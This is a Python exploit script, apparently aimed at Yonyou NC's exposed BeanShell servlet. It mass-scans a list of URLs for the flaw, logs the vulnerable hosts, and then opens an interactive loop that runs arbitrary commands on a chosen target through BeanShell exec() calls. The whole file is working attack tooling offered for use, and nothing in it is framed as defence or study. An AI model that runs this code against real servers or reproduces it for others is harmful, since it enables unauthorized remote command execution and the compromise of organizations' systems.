import requests,argparse,urllib3,sys,re
from multiprocessing.dummy import Pool
from termcolor import colored
urllib3.disable_warnings()


def banner():
    demo = """██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗███╗   ██╗ ██████╗██████╗  ██████╗  ██████╗
╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║████╗  ██║██╔════╝██╔══██╗██╔═══██╗██╔════╝
 ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║██╔██╗ ██║██║     ██████╔╝██║   ██║██║     
  ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║██║╚██╗██║██║     ██╔═══╝ ██║   ██║██║     
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝██║ ╚████║╚██████╗██║     ╚██████╔╝╚██████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝      ╚═════╝  ╚═════╝                                                                                                       
"""
    colored_demo = colored(demo, 'blue')
    print(colored_demo)
def main():
    banner()
    parser = argparse.ArgumentParser(description='Welcome to use the POC!')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file path')
    args=parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        with open(args.file,'r',encoding='utf-8')as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> or -f <file>")
def poc(target):
    payload = '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cookie': 'JSESSIONID=6F81F16A658FEAF2F7DDAFB93971DA7C.server',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = 'bsh.script=print("hacker");'
    try:
        res1 = requests.get(url=target+payload,headers=headers,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload,headers=headers,data=data,timeout=5,verify=False)
            match = re.findall(r'<pre>(.*?)</pre>',res2.text,re.S)
            for i in match:
                if 'hacker' in i.strip():
                    print(f'{target}存在漏洞')
                    with open('result.txt', 'a') as ff:
                        ff.write(target + '\n')
                        return True
                else:
                    print(f"{target} maybe not exist")
    except:
        pass
def exp(target):
    exp_payload = '/servlet/~ic/bsh.servlet.BshServlet'
    headers1 = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cookie': 'JSESSIONID=6F81F16A658FEAF2F7DDAFB93971DA7C.server',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    while True:
        print("进入命令输入循环")  # 调试信息
        cmd = input("请输入你要执行的命令：")
        if cmd =="q":
            exit()
        try:
            data1 = 'bsh.script=exec("' + cmd + '");'
            res1 = requests.post(url=target+exp_payload,headers=headers1,data=data1,timeout=5,verify=False)
            match = re.findall('''<pre>(.*?)</pre>''',res1.text,re.S)[0].strip()
            print(match)
        except:
            print("您执行的命令错误")


if __name__ == '__main__':
    main()